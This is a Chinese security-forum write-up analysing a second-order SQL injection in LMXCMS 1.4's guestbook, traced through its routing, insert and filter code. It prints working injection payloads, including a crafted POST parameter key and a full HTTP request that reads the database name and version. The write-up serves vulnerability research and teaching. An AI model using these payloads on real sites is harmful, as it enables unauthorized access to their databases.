### 前言

看了社区一位师傅发的[梦想cms的文章](https://forum.butian.net/share/955 "梦想cms的文章"),在cnvd一搜发现洞还挺多的，在本地审计复现了一下，于是写了这篇文章。

### 二次注入简述

二次注入是SQL注入的一种。漏洞的发生主要分为两步，第一步是攻击者构造恶意SQL语句，这些语句会插入并存储在数据库中，第二步是将存储在数据库中的恶意SQL语句取出，直接调用，这样就造成了SQL的二次注入。

### CMS框架

首先，了解一下cms的框架  
index.php  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-30b7430fd890c0697c1a991a3a8de97daa90ebba.png)

先define定义两个常量，然后require包含文件。/inc/config.inc.php中是网站的配置文件，简单浏览一下后继续看/inc/run.inc.php文件。  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fc21f45a875d89c9ef2bdf01c80106e8cd403b17.png)

69-73行中，通过Get方式传入参数m，控制调用的控制器，最后触发run()方法，跟进查看  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-62bb11e9724c84b78f97840198e8939ae8f4e1ce.png)

Get方式传入参数a，如果参数a代表的方法存在，则调用该方法，否则调用index方法。

### 漏洞分析

大概了解了cms的框架，下面开始漏洞分析  
漏洞出现在/index/BookAction.class.php文件，先访问看看  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9d695e3f9af324e0917aad3c340dd73de9f34d97.png)  
发现是留言版功能，那么可以猜想一下大概的流程，应该是可以通过留言插入sql语句到数据库中，然后下方显示留言的地方会调用数据库中的数据，从而造成二次注入。

下面来看具体代码  
留言提交代码块  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2e0f74204320e29b9de454b04bceb44a0f4c3b38.png)

当setbook参数不为空，会调用checkData方法对参数进行检测，主要是调用p()函数防止sql注入，这里暂且不看，继续往下，进入add方法  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-09756fb3311f72c0a39079a34929cb0421de1ac8.png)

跟进addModel()  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-97c4a1f393a12c335679d701ded08e6922aa0abe.png)

最后跟踪到addDB方法  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b1d1b9c50dabfe04b244357bf5f87e14119f2de0.png)

看到往数据库中插入的参数，$field和$value实际上就是传入的键值对的key和值  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-754c4366eae61854c990025d0055e28fa3360ac4.png)

可以发现，键值对的值是使用单引号进行包裹，但是key直接传入，没做任何过滤  
在cms的防止sql注入的过滤函数p()中，同样只对$v进行了过滤，忽略了$key  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c1644427abf8fb19fd79445c4c4a7290814436b0.png)

接下来留言看看插入的sql语句，在源码将sql语句输出，方便构造  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-52e9f9eba2a016b308f68578dfe921e1a8c3a935.png)  
可以看到sql语句是

```sql
INSERT INTO lmx_book(name,content,mail,tel,ip,time) VALUES('1','4','2','3','127.0.0.1','1640673423')
```

上面分析了键值对中的key没有过滤，那么可以尝试修改key构造注入语句

```sql
name=1&mail=2&tel=3&content=4&setbook=1&time)values('1','4','2','3','5','6')#=1
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-56cec503ed876382a3c1506a19df6116a622fbf5.png)

注入之后，回到页面发现并没有看到提交的留言，到mysql中看看  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-85981822fd455e5142d365c6782bab1e35fe2417.png)

可以看到留言确实是插入到了数据库中，之所以没有显示，是因为有一个参数ischeck  
在调用留言的代码中，可以看到只调用了’ischeck=1‘的留言  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fdb31fa51a97021b7bfa2d283c53db05ec1a4320.png)

那么我们再在数据包中添加一个参数，修改ischeck值为1  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0b597ba86200f4f5769728ba887115ba2be0fd49.png)

再次回到留言版，可以看到留言，且name和content处有回显  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4762ea7dbdbccb3aa828530a18ddba218edc40cd.png)

于是修改数据包，查询database()及version()

```markdown
POST /lmxcms1.4/index.php?m=Book&a=setBook HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/lmxcms1.4/?m=book
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

name=1&mail=2&tel=3&content=4&setbook=1&time,ischeck)values(database(),version(),'2','3','5','6','1')#=1
```

留言处成功回显数据库名及版本信息  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c4b2a4abe34567402d7510ea4c7eef04e2938d3a.png)

### 写在后面

二次注入可以说是比较难发现的一种注入，不仅需要插入数据，还需要找到将插入数据提取出来使用的地方。即使找到注入的地方，如果不能看到回显也是没有用处了。本文分析的漏洞官方出了相应补丁，将留言设置为前台不显示，从而防止了二次注入的第二步。